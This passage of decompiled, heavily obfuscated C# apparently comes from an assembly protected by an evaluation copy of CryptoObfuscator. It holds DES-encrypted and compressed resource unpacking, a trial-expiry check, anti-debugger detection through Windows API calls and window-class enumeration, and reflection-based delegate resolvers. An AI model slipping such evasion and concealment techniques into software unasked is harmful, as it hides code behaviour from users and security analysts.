				{
					_0003_0015._000F(_000B.m__000F, (int)_001F_0015._000F(stream));
				}
				else
				{
					_0003_0015._000F(_000B.m__000F, _000B.m__000F);
				}
			}
			_000B_0015._000F(_000B.m__000F, 0L);
			ICryptoTransform cryptoTransform = _0008_0015._000F(dESCryptoServiceProvider);
			int num2 = _0004_0015._000F(cryptoTransform);
			_001B_0015._000F(cryptoTransform);
			byte[] array4 = new byte[_001B_0015._000F(cryptoTransform)];
			byte[] array5 = new byte[_0004_0015._000F(cryptoTransform)];
			int k;
			for (k = (int)_0012_0015._000F(stream); k + num2 < _001F_0015._000F(stream); k += num2)
			{
				_0005_0015._000F(stream, array5, 0, num2);
				int num3 = _001A_0015._000F(cryptoTransform, array5, 0, num2, array4, 0);
				_0009_000D._000F(_000B.m__000F, array4, 0, num3);
			}
			_0005_0015._000F(stream, array5, 0, (int)(_001F_0015._000F(stream) - k));
			byte[] array6 = _001E_0015._000F(cryptoTransform, array5, 0, (int)(_001F_0015._000F(stream) - k));
			_0009_000D._000F(_000B.m__000F, array6, 0, array6.Length);
			stream2 = _000B.m__000F;
			_000B_0015._000F(stream2, 0L);
			memoryStream = _000B.m__000F;
		}
		if ((num & 8u) != 0)
		{
			if (_000B._000D == null)
			{
				if (_000B._000D == int.MinValue)
				{
					_0003_0015._000F(_000B._000D, (int)_001F_0015._000F(stream2) * 2);
				}
				else
				{
					_0003_0015._000F(_000B._000D, _000B._000D);
				}
			}
			_000B_0015._000F(_000B._000D, 0L);
			DeflateStream deflateStream = _0001_0015._000F(stream2, CompressionMode.Decompress);
			int num4 = 1000;
			byte[] array7 = new byte[num4];
			int num5;
			do
			{
				num5 = _0005_0015._000F(deflateStream, array7, 0, num4);
				if (num5 > 0)
				{
					_0009_000D._000F(_000B._000D, array7, 0, num5);
				}
			}
			while (num5 >= num4);
			memoryStream = _000B._000D;
		}
		if (memoryStream != null)
		{
			return _0009_0015._000F(memoryStream);
		}
		byte[] array8 = new byte[_001F_0015._000F(stream) - _0012_0015._000F(stream)];
		_0005_0015._000F(stream, array8, 0, array8.Length);
		return array8;
	}
}
internal class _0004
{
	private static string _000F(Assembly _000F)
	{
		string text = _0020_0015._000F(_000F);
		int num = _0015_0015._000F(text, ',');
		if (num >= 0)
		{
			text = _0016_0015._000F(text, 0, num);
		}
		return text;
	}

	internal static void _000F()
	{
		string text = "637523538976308587";
		DateTime dateTime = default(DateTime);
		_0006_0020._000F(ref dateTime, _0005_0020._000F(text));
		if (_0019_0020._000F(_001C_0020._000F(), dateTime))
		{
			string text2 = _000F(_0007_0015._000F());
			string text3 = _0010_0020._000F(new string[5]
			{
				"The assembly '",
				text2,
				"' is created with an evaluation version of CryptoObfuscator and will stop working on ",
				_0018_0020._000F(ref dateTime, "d-MMM-yyyy."),
				" The evaluation period has expired and the application will now exit."
			});
			throw _0007_0016._000F(text3);
		}
	}
}
internal class _0001
{
	[StructLayout(LayoutKind.Sequential)]
	internal class _0018
	{
		internal IntPtr _000F;

		internal IntPtr _000D;

		internal IntPtr _0016;

		internal IntPtr _0015;

		internal IntPtr _0020;

		internal IntPtr _001D;
	}

	internal delegate int _0019(IntPtr ProcessHandle, int ProcessInformationClass, _0018 ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);

	internal delegate int _001C(IntPtr ProcessHandle, int ProcessInformationClass, out uint debugPort, uint ProcessInformationLength, out uint ReturnLength);

	internal delegate int _0006();

	internal delegate void _0005([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

	internal delegate int _0012(IntPtr hProcess, ref int pbDebuggerPresent);

	internal delegate int _001F(IntPtr wnd, IntPtr lParam);

	internal delegate int _0009(_001F lpEnumFunc, IntPtr lParam);

	internal const uint _000F = 1024u;

	internal const uint _000D = 64u;

	internal const int _000F = 0;

	private static bool m__000F;

	[DllImport("kernel32.dll", EntryPoint = "SetLastError", ExactSpelling = true)]
	internal static extern void _000F(uint _000F);

	[DllImport("kernel32.dll", EntryPoint = "CloseHandle", ExactSpelling = true)]
	internal static extern int _000F(IntPtr _000F);

	[DllImport("kernel32.dll", EntryPoint = "OpenProcess", ExactSpelling = true)]
	internal static extern IntPtr _000D(uint _000F, int _000D, uint _0016);

	[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId", ExactSpelling = true)]
	internal static extern uint _000F();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "LoadLibrary", SetLastError = true)]
	internal static extern IntPtr _000F(string _000F);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0019 _000F(IntPtr _000F, string _000D);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _001C _000F(IntPtr _000F, string _000D);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0012 _000F(IntPtr _000F, string _000D);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0006 _000F(IntPtr _000F, string _000D);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0005 _000F(IntPtr _000F, string _000D);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0009 _000F(IntPtr _000F, string _000D);

	private static int _000F(IntPtr _000F, IntPtr _000D)
	{
		string[] array = new string[_001E._000F(4224)];
		array[_001E._000F(4228)] = _0003._000F(1366);
		string[] array2 = array;
		string text = _0001._000D(_000F);
		string[] array3 = array2;
		for (int i = _001E._000F(4232); i < array3.Length; i += _001E._000F(4248))
		{
			string text2 = array3[i];
			if (_001B_0016._000F(text, text2, (byte)_001E._000F(4236) != 0) == 0)
			{
				_0001.m__000F = (byte)_001E._000F(4240) != 0;
				return _001E._000F(4244);
			}
		}
		return _001E._000F(4252);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetClassName")]
	internal static extern int _000F(IntPtr _000F, StringBuilder _000D, int _0016);

	internal static string _000D(IntPtr _000F)
	{
		StringBuilder stringBuilder = _000A_0016._000F(_001E._000F(4256));
		_0001._000F(_000F, stringBuilder, _0008_0016._000F(stringBuilder));
		return _0013._000D(stringBuilder);
	}

	internal static void _000F()
	{
		if (_0001._000F())
		{
			string text = _0003._000F(1381);
			throw _0007_0016._000F(_0014_0016._000F(_0003._000F(1398), text));
		}
	}

	internal static bool _000F()
	{
		try
		{
			if (_0011_0016._000F())
			{
				return (byte)_001E._000F(4260) != 0;
			}
			IntPtr intPtr = _000F(_0003._000F(1525));
			_0006 obj = _0001._000F(intPtr, _0003._000F(1550));
			if (obj != null && _0002_0016._000F(obj) != 0)
			{
				return (byte)_001E._000F(4264) != 0;
			}
			uint num = _0001._000F();
			IntPtr intPtr2 = _000D((uint)_001E._000F(4268), _001E._000F(4272), num);
			if (_0013_0016._000F(intPtr2, IntPtr.Zero))
			{
				try
				{
					_0012 obj2 = _0001._000F(intPtr, _0003._000F(1585));
					if (obj2 != null)
					{
						int _0016 = _001E._000F(4276);
						if (_000E_0016._000F(obj2, intPtr2, ref _0016) != 0 && _0016 != 0)
						{
							return (byte)_001E._000F(4280) != 0;
						}
					}
				}
				finally
				{
					_000F(intPtr2);
				}
			}
			bool flag = (byte)_001E._000F(4284) != 0;
			try
			{
				_000F(new IntPtr(_001E._000F(4288)));
			}
			catch
			{
				flag = (byte)_001E._000F(4292) != 0;
			}
			if (flag)
			{
				return (byte)_001E._000F(4296) != 0;
			}
			try
			{
				IntPtr intPtr3 = _000F(_0003._000F(1638));
				_0009 obj4 = _0001._000F(intPtr3, _0003._000F(1659));
				if (obj4 != null)
				{
					_0001.m__000F = (byte)_001E._000F(4300) != 0;
					_000C_0016._000F(obj4, _000F, IntPtr.Zero);
					if (_0001.m__000F)
					{
						return (byte)_001E._000F(4304) != 0;
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return (byte)_001E._000F(4308) != 0;
	}
}
internal class _001B
{
	private static readonly int m__000F;

	private static readonly int m__000D;

	private static readonly int _0016;

	private static readonly int _0015;

	private static readonly int _0020;

	private static readonly int _001D;

	private static readonly int _0017;

	private static readonly int _0010;

	private static readonly int _0018;

	private static readonly int _0019;

	private static readonly int _001C;

	private static readonly int _0006;

	private static readonly int _0005;

	private static readonly int _0012;

	private static readonly int _001F;

	private static readonly int _0009;

	private static readonly int _0001;

	private static readonly int _000B;

	private static readonly int _0003;

	private static readonly int _001E;

	private static readonly ModuleHandle m__000F;

	private int _000F => 1;

	static _001B()
	{
		if ((object)typeof(MulticastDelegate) != null)
		{
			_001B.m__000F = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
		}
	}

	public static void _000D(int _000F, int _000D, int _0016)
	{
		Type typeFromHandle;
		MethodInfo methodInfo;
		try
		{
			typeFromHandle = Type.GetTypeFromHandle(_001B.m__000F.ResolveTypeHandle(_000F));
			object obj = ((_0016 != 16777215) ? MethodBase.GetMethodFromHandle(_001B.m__000F.ResolveMethodHandle(_000D), _001B.m__000F.ResolveTypeHandle(_0016)) : MethodBase.GetMethodFromHandle(_001B.m__000F.ResolveMethodHandle(_000D)));
			methodInfo = (MethodInfo)obj;
		}
		catch (Exception)
		{
			throw;
		}
		FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
		foreach (FieldInfo fieldInfo in fields)
		{
			try
			{
				Delegate value;
				if (methodInfo.IsStatic)
				{
					value = Delegate.CreateDelegate(fieldInfo.FieldType, methodInfo);
				}
				else
				{
					ParameterInfo[] parameters = methodInfo.GetParameters();
					int num = parameters.Length + 1;
					Type[] array = new Type[num];
					if (methodInfo.DeclaringType!.IsValueType)
					{
						array[0] = methodInfo.DeclaringType!.MakeByRefType();
					}
					else
					{
						array[0] = typeof(object);
					}
					for (int j = 1; j < num; j++)
					{
						array[j] = parameters[j - 1].ParameterType;
					}
					DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodInfo.ReturnType, array, typeFromHandle, skipVisibility: true);
					ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
					iLGenerator.Emit(OpCodes.Ldarg_0);
					if (num > 1)
					{
						iLGenerator.Emit(OpCodes.Ldarg_1);
					}
					if (num > 2)
					{
						iLGenerator.Emit(OpCodes.Ldarg_2);
					}
					if (num > 3)
					{
						iLGenerator.Emit(OpCodes.Ldarg_3);
					}
					if (num > 4)
					{
						for (int k = 4; k < num; k++)
						{
							iLGenerator.Emit(OpCodes.Ldarg_S, k);
						}
					}
					iLGenerator.Emit(fieldInfo.IsFamilyOrAssembly ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
					iLGenerator.Emit(OpCodes.Ret);
					value = dynamicMethod.CreateDelegate(typeFromHandle);
				}
				fieldInfo.SetValue(null, value);
			}
			catch (Exception)
			{
			}
		}
	}
}
internal class _0008
{
	private static readonly int m__000F;

	private static readonly int _000D;

	private static readonly int _0016;

	private static readonly int _0015;

	private static readonly int _0020;

	private static readonly int _001D;

	private static readonly int _0017;

	private static readonly int _0010;

	private static readonly int _0018;

	private static readonly int _0019;

	private static readonly int _001C;

	private static readonly int _0006;

	private static readonly int _0005;

	private static readonly int _0012;

	private static readonly int _001F;

	private static readonly int _0009;

	private static readonly int _0001;

	private static readonly int _000B;

	private static readonly int _0003;

	private static readonly int _001E;

	private static readonly ModuleHandle m__000F;

	static _0008()
	{
		if ((object)typeof(MulticastDelegate) != null)
		{
			_0008.m__000F = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
		}
	}

	public static void _000F(int _000F, int _000D, int _0016)
	{
		Type typeFromHandle;
		ConstructorInfo constructorInfo;
		try
		{
			typeFromHandle = Type.GetTypeFromHandle(_0008.m__000F.ResolveTypeHandle(_000F));
			object obj = ((_0016 != 16777215) ? MethodBase.GetMethodFromHandle(_0008.m__000F.ResolveMethodHandle(_000D), _0008.m__000F.ResolveTypeHandle(_0016)) : MethodBase.GetMethodFromHandle(_0008.m__000F.ResolveMethodHandle(_000D)));
			constructorInfo = (ConstructorInfo)obj;
		}
		catch (Exception)
		{
			throw;
		}
		FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
		foreach (FieldInfo fieldInfo in fields)
		{
			try
			{
				ParameterInfo[] parameters = constructorInfo.GetParameters();
				int num = parameters.Length;
				Type[] array = new Type[num];
				for (int j = 0; j < num; j++)
				{
					array[j] = parameters[j].ParameterType;
				}
				DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, constructorInfo.DeclaringType, array, typeFromHandle, skipVisibility: true);
				ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
				if (num > 0)
				{
					iLGenerator.Emit(OpCodes.Ldarg_0);
				}
				if (num > 1)
				{
					iLGenerator.Emit(OpCodes.Ldarg_1);
				}
				if (num > 2)
				{
					iLGenerator.Emit(OpCodes.Ldarg_2);
				}
				if (num > 3)
				{
					iLGenerator.Emit(OpCodes.Ldarg_3);
				}
				if (num > 4)
				{
					for (int k = 4; k < num; k++)
					{
						iLGenerator.Emit(OpCodes.Ldarg_S, k);
					}
				}
				iLGenerator.Emit(OpCodes.Newobj, constructorInfo);
				iLGenerator.Emit(OpCodes.Ret);
				Delegate value = dynamicMethod.CreateDelegate(typeFromHandle);
				fieldInfo.SetValue(null, value);
			}
			catch (Exception)
			{
			}
		}
	}
}
internal class _000A
{
	private static readonly int m__000F;

	private static readonly int _000D;

	private static readonly int _0016;

	private static readonly int _0015;

	private static readonly int _0020;

	private static readonly int _001D;

	private static readonly int _0017;

	private static readonly int _0010;

	private static readonly int _0018;

	private static readonly int _0019;

	private static readonly int _001C;

	private static readonly int _0006;

	private static readonly int _0005;

	private static readonly int _0012;

	private static readonly int _001F;

	private static readonly int _0009;

	private static readonly int _0001;

	private static readonly int _000B;

	private static readonly int _0003;

	private static readonly int _001E;

	private static readonly ModuleHandle m__000F;

	static _000A()
	{
		if ((object)typeof(MulticastDelegate) != null)
		{
			_000A.m__000F = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
		}
	}

	public static void _000F(int _000F, int _000D, int _0016)
	{
		Type typeFromHandle;
		ConstructorInfo constructorInfo;
		try
		{
			typeFromHandle = Type.GetTypeFromHandle(_000A.m__000F.ResolveTypeHandle(_000F));
			object obj = ((_0016 != 16777215) ? MethodBase.GetMethodFromHandle(_000A.m__000F.ResolveMethodHandle(_000D), _000A.m__000F.ResolveTypeHandle(_0016)) : MethodBase.GetMethodFromHandle(_000A.m__000F.ResolveMethodHandle(_000D)));
			constructorInfo = (ConstructorInfo)obj;
		}
		catch (Exception)
		{
			throw;
		}
		FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
		foreach (FieldInfo fieldInfo in fields)
		{
			try
			{
				ParameterInfo[] parameters = constructorInfo.GetParameters();
				int num = parameters.Length + 1;
				Type[] array = new Type[num];
				array[0] = constructorInfo.DeclaringType!.MakeByRefType();
				for (int j = 1; j < num; j++)
				{
					array[j] = parameters[j - 1].ParameterType;
				}
				DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, null, array, typeFromHandle, skipVisibility: true);
				ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
				if (num > 0)
				{
					iLGenerator.Emit(OpCodes.Ldarg_0);
				}
				if (num > 1)
				{
					iLGenerator.Emit(OpCodes.Ldarg_1);
				}
				if (num > 2)
				{
					iLGenerator.Emit(OpCodes.Ldarg_2);
				}
				if (num > 3)
				{
					iLGenerator.Emit(OpCodes.Ldarg_3);
				}
				if (num > 4)
				{
					for (int k = 4; k < num; k++)
					{
						iLGenerator.Emit(OpCodes.Ldarg_S, k);
					}
				}
				iLGenerator.Emit(OpCodes.Call, constructorInfo);
				iLGenerator.Emit(OpCodes.Ret);
				Delegate value = dynamicMethod.CreateDelegate(typeFromHandle);
				fieldInfo.SetValue(null, value);
			}
			catch (Exception)
			{
			}
		}
	}
}
internal delegate bool _0002(object, string);
internal delegate bool _0007(object, object);
internal delegate Type _000E(RuntimeTypeHandle);
internal delegate string _0011(object);
internal delegate string _0013(object);
internal delegate object _0014(object);
internal delegate string _0020_0015(object);
internal delegate void _0020_0016(object, object[], string[]);
internal delegate long _0005_0020(string);
internal delegate void _0006_0020(ref DateTime, long);
internal delegate Assembly _000F_0020(byte[]);
internal delegate string _0010_0020(string[]);
internal delegate string _0015_0020(object);
internal delegate bool _0016_0020(object, string);
internal delegate string[] _0017_0020(object);
internal delegate string _0018_0020(ref DateTime, string);
internal delegate bool _0019_0020(DateTime, DateTime);
internal delegate DateTime _001C_0020();
internal delegate bool _001D_0020(string, string);
internal delegate string _0020_0020(object, object);
internal delegate string _0020_000D(char);
internal delegate byte[] _0009_0015(object);
internal delegate void _0009_0016(Exception);
internal delegate void _0009_000D(object, byte[], int, int);
internal delegate void _000A_0015(object, byte[]);
internal delegate StringBuilder _000A_0016(int);
internal delegate void _000A_000D(Exception, int);
internal delegate void _000B_0015(object, long);
internal delegate ResourceManager _000B_0016(string, Assembly);
internal delegate void _000B_000D(object, long);
internal delegate int _000C(object);
internal delegate DESCryptoServiceProvider _000C_0015();
internal delegate int _000C_0016(object, _0001._001F lpEnumFunc, IntPtr lParam);
internal delegate bool _000C_000D(object);
internal delegate MemoryStream _000D_0015(int);
internal delegate object _000D_0016(object, object, bool);
internal delegate Stream _0001_000D(object);
internal delegate object _0002_000D(object, object);
internal delegate void _0003_000D(object, string);
internal delegate void _0004_000D(object, string);
internal delegate StreamReader _0005_000D(Stream);
internal delegate string _0006_000D(object);
internal delegate object _0007_000D(object, Type, string, object[], string[], Type[], bool[], bool);
internal delegate void _0008_000D();
internal delegate object _000E_000D(object);
internal delegate string _000F_000D(string, string, string, string);
internal delegate int _0010_000D(object, string);
internal delegate bool _0011_000D(object, object, bool);
internal delegate Stream _0012_000D(object);
internal delegate object _0013_000D(object, Type, string, object[], string[], Type[], bool[]);
internal delegate object _0014_000D(object, object[], string[]);
internal delegate string _0015_000D(int);
internal delegate string _0016_000D(string, string);
internal delegate string _0017_000D(object, int);
internal delegate void _0018_000D(object);
internal delegate void _0019_000D(object);
internal delegate Encoding _001A_000D();
internal delegate WebRequest _001B_000D(string);
internal delegate void _001C_000D(object);
internal delegate char _001D_000D(int);
internal delegate byte[] _001E_000D(object, string);
internal delegate WebResponse _001F_000D(object);
internal delegate Stream _000D_0020(object, string);
internal delegate string _000D_000D(string, string, string, int, int, CompareMethod);
